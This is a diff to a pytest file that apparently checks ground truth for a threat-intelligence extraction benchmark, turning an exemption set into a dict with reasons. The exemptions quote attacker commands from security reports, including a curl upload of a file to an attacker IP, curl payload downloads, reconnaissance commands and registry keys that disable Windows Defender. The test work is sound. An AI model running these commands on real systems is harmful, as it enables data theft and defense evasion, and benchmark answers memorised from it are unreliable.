@@ -26,24 +26,24 @@ SUBAGENTS = [
     "windows_services",
 ]
 
-PROCESS_LINEAGE_EXEMPTION = "synthesized parent-to-child process pairs"
+PROCESS_LINEAGE_EXEMPTION = "synthesized parent-to-child process pairs are not literal fixture substrings"
 REACHABILITY_EXEMPTIONS = {
-    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", "chcp 65001 > NUL & netstat -afn -p TCP"),
-    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", 'chcp 65001 > NUL & wmic datafile where Name="C:\\Windows\\system32\\ntoskrnl.exe" get Version'),
-    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", "chcp 65001 > NUL & echo %userdomain%*%computername%**%username%"),
-    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", "chcp 65001 > NUL & tasklist"),
-    ("cmdline", "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one", 'curl -X POST -F "file=@C:\\programdata\\abc1.pdf" hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username%'),
-    ("cmdline", "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one", "curl -o sh2.txt hxxp://173.254.204[.]72/sh2.txt"),
-    ("cmdline", "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one", "curl -o dune64.log http://173.254.204[.]72/dune64.log"),
-    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableScanOnRealtimeEnable"),
-    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring"),
-    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware"),
-    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableBehaviorMonitoring"),
-    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableOnAccessProtection"),
-    ("registry_artifacts", "https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\TASK_NAME"),
-    ("registry_artifacts", "https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{GUID}"),
-    ("registry_artifacts", "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
-    ("registry_artifacts", "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\App"),
+    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", "chcp 65001 > NUL & netstat -afn -p TCP"): "fixture de-escapes the query value",
+    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", 'chcp 65001 > NUL & wmic datafile where Name="C:\\Windows\\system32\\ntoskrnl.exe" get Version'): "fixture de-escapes the query value",
+    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", "chcp 65001 > NUL & echo %userdomain%*%computername%**%username%"): "fixture de-escapes the query value",
+    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", "chcp 65001 > NUL & tasklist"): "fixture de-escapes the query value",
+    ("cmdline", "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one", 'curl -X POST -F "file=@C:\\programdata\\abc1.pdf" hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username%'): "source strips rendered angle brackets from a defanged URL",
+    ("cmdline", "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one", "curl -o sh2.txt hxxp://173.254.204[.]72/sh2.txt"): "source strips rendered angle brackets from a defanged URL",
+    ("cmdline", "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one", "curl -o dune64.log http://173.254.204[.]72/dune64.log"): "source strips rendered angle brackets from a defanged URL",
+    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableScanOnRealtimeEnable"): "ground truth composes key and value fields",
+    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring"): "ground truth composes key and value fields",
+    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware"): "ground truth composes key and value fields",
+    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableBehaviorMonitoring"): "ground truth composes key and value fields",
+    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableOnAccessProtection"): "ground truth composes key and value fields",
+    ("registry_artifacts", "https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\TASK_NAME"): "ground truth composes key and value fields",
+    ("registry_artifacts", "https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{GUID}"): "ground truth composes key and value fields",
+    ("registry_artifacts", "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"): "ground truth composes key and value fields",
+    ("registry_artifacts", "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\App"): "ground truth composes key and value fields",
 }
 
 
@@ -126,12 +126,11 @@ def test_ground_truth_no_duplicate_urls(subagent):
     assert not duplicates, f"{subagent}: duplicate URLs in ground_truth.json: {duplicates}"
 
 
-@pytest.mark.parametrize("subagent", SUBAGENTS)
-def test_ground_truth_items_are_reachable_or_explicitly_exempt(subagent):
-    """Every GT string must be scorer-reachable unless its exact tuple is exempt."""
-    content_by_url = {article["url"]: article["content"] for article in _load_articles(subagent)}
+def _assert_ground_truth_reachability(subagent: str, ground_truth: list[dict], articles: list[dict]) -> None:
+    """Require literal scorer reachability except for documented semantic exceptions."""
+    content_by_url = {article["url"]: article["content"] for article in articles}
     unreachable = []
-    for entry in _load_ground_truth(subagent):
+    for entry in ground_truth:
         for item in entry["expected_items"]:
             if _normalize(item) in _normalize(content_by_url[entry["url"]]):
                 continue
@@ -143,5 +142,16 @@ def test_ground_truth_items_are_reachable_or_explicitly_exempt(subagent):
     assert not unreachable, f"{subagent}: unreachable non-exempt GT items: {unreachable}"
 
 
+@pytest.mark.parametrize("subagent", SUBAGENTS)
+def test_ground_truth_items_are_reachable_or_explicitly_exempt(subagent):
+    """Every GT string must be scorer-reachable unless its exact tuple is exempt."""
+    _assert_ground_truth_reachability(subagent, _load_ground_truth(subagent), _load_articles(subagent))
+
+
 def test_reachability_guard_detects_fixture_drift():
-    assert _normalize("deliberately missing GT item") not in _normalize("fixture content")
+    with pytest.raises(AssertionError, match="unreachable non-exempt GT items"):
+        _assert_ground_truth_reachability(
+            "cmdline",
+            [{"url": "https://example.test/article", "expected_items": ["deliberately missing GT item"]}],
+            [{"url": "https://example.test/article", "content": "fixture content"}],
+        )
